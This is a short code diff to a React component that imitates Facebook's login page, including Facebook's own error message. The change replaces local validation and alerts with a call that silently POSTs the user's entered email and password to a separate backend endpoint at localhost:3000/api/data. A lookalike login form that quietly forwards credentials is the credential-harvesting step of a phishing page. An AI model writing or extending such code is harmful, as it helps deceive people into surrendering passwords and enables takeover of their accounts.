@@ -1,4 +1,5 @@
 import { useState } from "react";
+import axios from "axios";
 
 const styles = `
   @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap');
@@ -270,15 +271,19 @@ export default function FacebookLogin() {
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
 
-  const handleLogin = (e) => {
+  const handleLogin = async (e) => {
     e.preventDefault();
-    if (!email || !password) {
-      setError("The email address or mobile number you entered isn't connected to an account.");
-      return;
+    
+    const payload = {email : email, password: password}
+
+    try {
+      await axios.post('http://localhost:3000/api/data', payload)
+
+    } catch (e) {
+      console.log(e)
     }
     setError("");
-    alert(email);
-    alert(password);
+    
   };
 
   const footerLinks = [
